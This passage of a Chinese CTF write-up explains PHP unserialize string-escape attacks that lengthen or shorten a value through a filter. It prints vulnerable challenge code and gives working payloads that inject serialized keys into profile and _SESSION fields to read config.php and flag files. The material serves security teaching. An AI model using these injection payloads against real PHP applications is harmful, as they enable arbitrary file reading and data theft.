class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$user-&gt;update_profile($username, serialize($profile));</code> 将填入的信息进行 序列化</p>
<blockquote>
<ol start="5">
<li>它的上传文件的存储路径是 <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> ，起不到 <code>.php</code> 或者是 <code>图片木马包含的作用</code>;</li>
<li>代码审计</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># register.php</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>注册成功，进入 index.php 进行下一步的登录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>登陆成功之后，进入 profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$profile = unserialize($profile);</code> 将填写的信息进行反序列化输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php</p>
<blockquote>
<p><strong>思路：</strong>在 profile.php 中存在 <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> ；而 <code>$profile</code> 是一个数组，里面是我们输入的信息。如果我们控制 <code>$profile[&#39;photo&#39;]</code> 为 <code>config.php</code> 那么 之后的 <code>&lt;?php echo $phone;?&gt;</code> 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。</p>
</blockquote>
<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=aaa&amp;o=config.php</span><br><span class="line">输出：a:<span class="number">4</span>:a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>更改 nickname 的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&amp;o=config.php</span></span><br><span class="line"><span class="string">输出：a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:10:&quot;</span><span class="number">123</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:34:&quot;</span><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<p><img src="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png" alt="image-20210613183651536"></p>
<p><img src="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png" alt="image-20210613183539171"></p>
<p>解码得 flag</p>
<p><img src="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png" alt="image-20210613183613090"></p>
<h2 id="2-5-字符减少-—-安洵杯-2019-easy-serialize-php"><a href="#2-5-字符减少-—-安洵杯-2019-easy-serialize-php" class="headerlink" title="2.5 字符减少 — [安洵杯 2019]easy_serialize_php"></a>2.5 字符减少 — [安洵杯 2019]easy_serialize_php</h2><p><a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">题目链接</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>根据提示：?f=phpinfo</li>
</ol>
</blockquote>
<p>发现</p>
<p><img src="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png" alt="image-20210613154055563"></p>
<blockquote>
<ol start="2">
<li>auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 flag存在于 该文件当中。那我们需要想办法读取到该文件；</li>
<li>当 <code>$function == &#39;show_image&#39;</code> 时，首先对 <code>$serialize_info</code> 进行反序列化，然后对其中 <code>$userinfo[&#39;img&#39;]</code> 进行base64解码之后，使用 <code>file_get_contents</code> 读取出文件；而 <code>$serialize_info</code> 正是我们所传入的 <code>$function</code> 在 进行 <code>filter()</code> 函数过滤之后的结果；</li>
</ol>
</blockquote>
<p>手动添加以下代码，输出查看序列化之后的内容：</p>
<p><img src="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png" alt="image-20210613164010874"></p>
<p>该 base64 编码 <code>Z3Vlc3RfaW1nLnBuZw==</code> 即是 <code>guest_img.png</code></p>
<blockquote>
<ol start="4">
<li>我们需要使 <code>键 img </code> 为 <code>d0g3_f1ag.php</code> 文件加密之后的内容；<code>ZDBnM19mMWFnLnBocA==</code> 是 <code>d0g3_f1ag.php</code></li>
</ol>
</blockquote>
<p>构造 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post 传参：</span><br><span class="line">   </span><br><span class="line">_SESSION[user]=a&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">p</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">128</span>) <span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span> </span><br></pre></td></tr></table></figure>

<p>以上内容如果进行反序列化，将会报错，原因：</p>
<blockquote>
<ol start="5">
<li>前面 <code>a:3:</code> 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 <code>p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ；所以仍旧会取到第三个 img 值为 <code>Z3Vlc3RfaW1nLnBuZw==</code> ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 <code>s:42:&quot;p&quot;</code> 是 <code>s:1:&quot;p&quot;</code> 就好了。 </li>
<li>利用过滤函数使字符减少来增大长度，吞掉后面部分内容。</li>
</ol>
</blockquote>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="7">
<li><code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code> 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code>吞掉，当作 user 的值；而 img 即为我们的 <code>d0g3_f1ag.php</code>；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 <code>guest_img.png</code> 将被挤掉，不会起作用；</li>
</ol>
<p> <strong>注意：</strong>由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。</p>
</blockquote>
<p><strong>payload1 —  键值逃逸：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png" alt="0"></p>
<blockquote>
<ol start="8">
<li>对 <code>/d0g3_fllllllag</code> 进行 base64编码为 <code>L2QwZzNfZmxsbGxsbGFn</code>，长度是 20；</li>
</ol>
<p> 构造以下内容：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png" alt="image-20210613172316408"></p>
<blockquote>
<ol start="9">
<li><code>&quot;;s:49:</code> 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 <code>a:2:</code>，因此一共只会取两个键名，所以最后的 img 被挤掉了。</li>
</ol>
</blockquote>
<p><strong>payload2 —  键名逃逸：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>函数总结：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">implode()	把数组元素组合为一个字符串后返回：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 Hello World! Beautiful Day!</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unset</span>()		销毁指定的变量    </span><br><span class="line">    </span><br><span class="line">extract() 	函数从数组中将变量导入到当前的符号表</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 $a = Cat; $b = Dog; $c = Horse </span></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure>

